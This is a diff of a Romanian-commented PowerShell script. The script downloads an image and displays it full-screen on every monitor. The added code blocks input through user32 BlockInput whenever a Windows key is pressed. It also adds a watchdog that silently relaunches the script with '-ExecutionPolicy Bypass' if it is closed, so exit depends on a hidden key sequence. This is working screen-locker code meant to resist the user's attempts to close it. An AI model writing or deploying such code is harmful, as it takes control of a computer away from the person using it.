@@ -2,30 +2,7 @@
 $imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
 $tempImagePath = "$env:TEMP\image.jpg"
 
-# Importă funcționalități din user32.dll
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class KeyboardInterceptor {
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
-}
-"@
-
-# Blochează tastele critice (Windows și Alt)
-function Block-Keys {
-    while ($true) {
-        Start-Sleep -Milliseconds 100
-        if ([KeyboardInterceptor]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows
-            Start-Sleep -Milliseconds 100
-        }
-        if ([KeyboardInterceptor]::GetAsyncKeyState(0x12) -ne 0) { # Tasta Alt
-            Start-Sleep -Milliseconds 100
-        }
-    }
-}
-
-# Descărcare imagine
+# Funcție pentru descărcarea imaginii
 function Download-Image {
     try {
         Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
@@ -33,6 +10,35 @@ function Download-Image {
         Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
         exit
     }
+}
+
+# Funcție pentru blocarea tastei Windows
+function Block-WindowsKey {
+    Add-Type @"
+        using System;
+        using System.Runtime.InteropServices;
+        public class InterceptKeys {
+            [DllImport("user32.dll")]
+            public static extern int GetAsyncKeyState(int vKey);
+            [DllImport("user32.dll")]
+            public static extern int BlockInput(bool block);
+        }
+"@
+    Start-Job -ScriptBlock {
+        while ($true) {
+            Start-Sleep -Milliseconds 100
+            if ([InterceptKeys]::GetAsyncKeyState(0x5B) -ne 0) { # Tasta Windows stânga
+                [InterceptKeys]::BlockInput($true)
+                Start-Sleep -Milliseconds 100
+                [InterceptKeys]::BlockInput($false)
+            }
+            if ([InterceptKeys]::GetAsyncKeyState(0x5C) -ne 0) { # Tasta Windows dreapta
+                [InterceptKeys]::BlockInput($true)
+                Start-Sleep -Milliseconds 100
+                [InterceptKeys]::BlockInput($false)
+            }
+        }
+    } | Out-Null
 }
 
 # Afișare imagine pe toate monitoarele
@@ -84,6 +90,19 @@ function Show-FullScreenImage {
     [System.Windows.Forms.Application]::Run()
 }
 
+# Funcție de monitorizare pentru repornire automată
+function Monitor-Image {
+    $scriptPath = $MyInvocation.MyCommand.Definition
+
+    while ($true) {
+        $processes = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$scriptPath*" }
+        if (-not $processes) {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
 # Funcție pentru oprirea completă a aplicației (folosind `cdr`)
 function Stop-All {
     $global:exitFlag = $true
@@ -91,7 +110,8 @@ function Stop-All {
     exit
 }
 
-# Executare aplicație principală și monitorizare
+# Pornire aplicație
 Download-Image
-Start-Job -ScriptBlock { Block-Keys }
+Block-WindowsKey
+Start-Job -ScriptBlock { Monitor-Image }
 Show-FullScreenImage
